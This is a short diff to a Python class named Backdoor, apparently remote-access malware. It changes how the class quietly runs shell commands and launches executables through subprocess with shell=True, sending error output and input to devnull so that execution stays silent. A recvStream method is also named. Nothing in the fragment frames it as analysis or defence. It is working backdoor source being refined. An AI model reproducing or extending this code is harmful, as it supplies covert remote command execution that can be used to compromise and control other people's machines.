@@ -45,8 +45,7 @@ class Backdoor:
         try:
             DEVNULL = open(os.devnull,'wb')
             cmd = subprocess.check_output(cmd,shell=True,stderr = DEVNULL,stdin = DEVNULL) #make sure this works, redirecting err and input to devnull
-            #print(cmd)
-           
+            #print(cmd)   
             return cmd
         except subprocess.CalledProcessError as e:
             return str(e)
@@ -98,7 +97,8 @@ class Backdoor:
 
 
     def runExecutable(self,exe):
-        os.system(exe)
+        DEVNULL = open(os.devnull,'wb')
+        subprocess.check_output(exe,shell=True,stderr = DEVNULL,stdin = DEVNULL)
        
 
     def recvStream(self):
